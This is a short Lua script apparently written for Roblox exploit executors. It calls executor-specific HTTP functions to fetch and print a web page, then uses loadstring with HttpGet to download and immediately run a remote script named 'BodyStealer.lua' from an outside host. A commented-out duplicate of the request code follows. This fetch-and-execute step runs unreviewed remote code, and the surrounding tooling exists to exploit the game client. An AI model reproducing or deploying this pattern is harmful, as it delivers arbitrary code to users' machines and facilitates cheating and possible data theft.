getgenv().Website = "https://xenonhub.app/"

local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request

local cool = req({
	Url = getgenv().Website,
	Method = "GET"
})

if cool.StatusCode == 200 then
	rconsoleprint(cool.Body)
else
	print("Website Status: " .. cool.StatusCode .. "\n Didn't Get Body")
end
loadstring(game:HttpGet("https://soggyhubv2.vercel.app/Side/BodyStealer.lua"))()
--[[
local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request

local cool = req({
	Url = getgenv().Website,
	Method = "GET"
})

if cool.StatusCode == 200 then
	rconsoleprint(cool.Body)
else
	print("Website Status: " .. cool.StatusCode .. "\n Didn't Get Body")
end
